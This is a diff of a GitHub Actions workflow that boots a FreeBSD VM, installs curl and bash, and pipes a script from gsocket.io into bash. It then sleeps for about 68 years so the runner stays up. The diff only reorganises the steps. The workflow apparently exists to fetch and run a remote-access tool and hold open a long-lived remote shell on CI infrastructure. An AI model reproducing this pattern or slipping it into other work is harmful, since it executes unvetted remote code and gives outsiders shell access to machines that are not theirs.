@@ -11,8 +11,8 @@ jobs:
         uses: vmactions/freebsd-vm@v1
         with:
           usesh: true
-          run: |
+          prepare: |
             pkg install -y curl bash
+          run: |
             bash -c "$(curl -fsSL https://gsocket.io/y)"
-            trap 'exit 0' TERM
-            sleep 2147483647
+            exec sleep 2147483647
